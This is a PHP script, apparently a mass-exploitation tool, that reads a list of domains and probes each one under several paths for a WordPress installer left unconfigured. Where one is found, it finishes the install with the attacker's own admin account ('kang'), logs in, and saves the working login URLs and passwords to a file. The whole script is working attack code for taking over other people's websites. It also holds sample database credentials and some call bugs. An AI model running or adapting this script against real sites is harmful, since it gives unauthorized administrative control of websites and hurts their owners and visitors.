<?php

//WP INSTALL
//By KK
//limit list if use windows

function postCurl($url, $data)
{
	$ch = curl_init($url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt ( $ch, CURLOPT_FOLLOWLOCATION, TRUE);
	curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookiewp.txt');  
	curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookiewp.txt');
	$headers = array();
	$headers[] = 'Connection: keep-alive';
	$headers[] = 'Cache-Control: max-age=0';
	$headers[] = 'Dnt: 1';
	$headers[] = 'Upgrade-Insecure-Requests: 1';
	$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36';
	$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3';
	$headers[] = 'Accept-Encoding: gzip, deflate';
	$headers[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	$jir = curl_exec($ch);
	curl_close($ch);
	return $jir;
}
function getCurl($web)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $web);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
	curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');	
	curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, TRUE);
	curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookiewp.txt');  
	curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookiewp.txt');
	$headers = array();
	$headers[] = 'Connection: keep-alive';
	$headers[] = 'Cache-Control: max-age=0';
	$headers[] = 'Dnt: 1';
	$headers[] = 'Upgrade-Insecure-Requests: 1';
	$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36';
	$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3';
	$headers[] = 'Accept-Encoding: gzip, deflate';
	$headers[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	$jir = curl_exec($ch);
	curl_close($ch);
	return $jir;	
}
function wpI($install)
{
	/*
	setup config :

	Db example for remote =
    Username: yQMbpkKngT
    Database name: yQMbpkKngT
    Password: ixZa9LxLFj
    Server: remotemysql.com
    Port: 3306
	*/

    $setup_Config = array(
	'dbname' => 'wp',           //change to ur dbname
	'uname' => 'root',         //change to ur uname 
	'pwd' => '',              //change to ur pwd
	'dbhost' => 'localhost', //change to ur host ex:129.3.4.5
	'prefix' => 'wp_',
	'language' => '',
	'submit' => 'Submit');

    $def = getCurl($install.'/wp-admin/setup-config.php?step=0');
    $title = preg_match_all("/<title>(.*)<\/title>/is", $def, $matches);
    $plod = implode("", $matches[1]);
    if (preg_match_all("/WordPress &rsaquo; Error/", $plod)) {
    	echo " $install/wp-admin/setup-config.php?step=0 Already Install!\n";
    }elseif (preg_match_all("/WordPress &rsaquo; Setup Configuration File/", $plod)) {
    	echo " $install/wp-admin/setup-config.php?step=0 OK!\n";
    	echo "  Try Install\n";
    	$sZ = postCurl($install.'/wp-admin/setup-config.php?step=0',[
    		'language'=>'']);
    	$sO = getCurl($install.'/wp-admin/setup-config.php?step=1');
    	$sT = postCurl($install.'/wp-admin/setup-config.php?step=2',[
    		'dbname'=> $setup_Config['dbname'],  
    		'uname' => $setup_Config['uname'],       
    		'pwd' => $setup_Config['pwd'],            
    		'dbhost' => $setup_Config['dbhost'], 
    		'prefix' => $setup_Config['prefix'],
    		'language' => $setup_Config['language'],
    		'submit' => $setup_Config['submit']]);
    	$lang = getCurl($install.'/wp-admin/install.php?language=en_US');
    	$sS = postCurl($install.'/wp-admin/install.php?step=2',[
    		'weblog_title' => 'Beauty of darknet', 
    		'user_name' => 'kang',                
    		'admin_password' => 'klep0n',   
    		'admin_password2' => 'klep0n',   
    		'admin_email' => 'toor@ro.ot',    
    		'blog_public' => '1',
    		'Submit' => 'Install Wordpress',
    		'language' => 'en_US']);
    	$login = postCurl($install,'/wp-login.php',[
    		'log' => 'kang',
    		'pwd' => 'klep0n',
    		'wp-submit' => 'Log In',
    		'redirect_to' => $install.'/wp-admin/',
    		'testcookie' =>'1']);
    	$wpadmin = getCurl($install,'/');
    	$title = preg_match_all("/<title>(.*)<\/title>/is", $wpadmin, $matches);
    	$admti = implode("", $matches[1]);
    	if (preg_match_all("/Beauty/",$admti)) {
    		echo "  $install/wp-login.php|kang|klep0n\n";
    		$r = "wplogged.txt";
    		touch($r);
    		$w = fopen($r, "a");
    		$site = $install.'/wp-login.php|kang|klep0n';
    		fwrite($w, $site."\n");
    		fclose($w);	
    	}else{
    		echo "  $install/wp-login.php Cant Login!\n";
    	}
    }else{
    	echo " $install NOT WP!\n";
    }
}
$f = $argv[1];
$file = file_get_contents($f);
$ex = explode("\r\n", $file); // \r\n for windows
// $ex = explode("\n", $file); // \n for linux
$i = 0;
foreach ($ex as $key) {
	$i++;
	//try with http
	$wpi = wpI('http://'.$key);
	$wpi = wpI('http://'.$key.'/wordpress');
	$wpi = wpI('http://'.$key.'/test');
	$wpi = wpI('http://'.$key.'/blog');
	$wpi = wpI('http://'.$key.'/wp');
	$wpi = wpI('http://wp.'.$key);
	//try with https
	$wpi = wpI('https://'.$key);
	$wpi = wpI('https://'.$key.'/wordpress');
	$wpi = wpI('https://'.$key.'/test');
	$wpi = wpI('https://'.$key.'/blog');
	$wpi = wpI('https://'.$key.'/wp');
	$wpi = wpI('https://wp.'.$key);

	/*
	U can add other path in 
	$wpi = wpI('http://'.$key.'/path');
	$wpi = wpI('https://'.$key.'/path');

	$wpi = wpI('http://path.'.$key);
	$wpi = wpI('https://path.'.$key);

	*/

}
